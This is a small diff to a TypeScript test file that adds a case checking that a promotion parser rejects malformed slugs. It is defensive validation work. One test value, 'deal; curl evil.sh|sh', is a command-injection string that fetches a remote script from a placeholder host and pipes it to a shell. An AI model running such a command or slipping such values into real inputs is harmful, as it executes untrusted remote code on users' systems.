@@ -34,6 +34,14 @@ describe("parseClawHubPromotion", () => {
     expect(() => parseClawHubPromotion({ ...validPromotion, models: [] })).toThrow(/models/);
   });
 
+  it("rejects slugs outside ClawHub's slug contract", () => {
+    // Slugs are echoed into copy-paste commands; shell metacharacters must fail parsing.
+    expect(() =>
+      parseClawHubPromotion({ ...validPromotion, slug: "deal; curl evil.sh|sh" }),
+    ).toThrow(/slug/);
+    expect(() => parseClawHubPromotion({ ...validPromotion, slug: "UPPER-case" })).toThrow(/slug/);
+  });
+
   it("rejects non-string model refs", () => {
     expect(() => parseClawHubPromotion({ ...validPromotion, models: [{ modelRef: 42 }] })).toThrow(
       /modelRef/,
